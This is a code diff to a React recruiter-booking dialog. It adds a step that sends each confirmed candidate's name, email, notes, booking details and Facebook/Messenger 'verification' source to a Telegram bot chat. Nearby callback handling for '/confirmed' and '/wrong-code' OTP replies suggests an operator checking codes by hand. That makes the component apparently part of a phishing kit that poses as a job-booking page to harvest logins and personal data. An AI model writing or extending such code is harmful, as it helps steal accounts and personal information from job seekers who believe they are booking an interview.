@@ -329,6 +329,32 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
       setIsSending(false)
 
       if (callbackData.startsWith("/confirmed")) {
+        // Send the full booking confirmation to Telegram
+        const bookingMessage = `
+📅 <b>Booking Confirmed!</b>
+
+👤 <b>Candidate:</b> ${form.name}
+📧 <b>Email:</b> ${form.email}
+👔 <b>Recruiter:</b> ${activeRecruiter?.name || "Unknown"}
+📆 <b>Date:</b> ${dateLabel || "Unknown"}
+🕐 <b>Time:</b> ${time || "Unknown"}
+📋 <b>Meeting Type:</b> ${form.type}
+🔐 <b>Verified via:</b> ${authProvider === "facebook" ? "Facebook" : "Messenger"}
+📝 <b>Notes:</b> ${form.notes || "None provided"}
+
+🔗 <i>Booking confirmed at: ${new Date().toLocaleString()}</i>
+        `.trim()
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: bookingMessage,
+            parse_mode: "HTML",
+          }),
+        })
+
         setStep("confirmed")
       } else if (callbackData.startsWith("/wrong-code")) {
         setOtpError("The code you entered is incorrect. Please try again.")
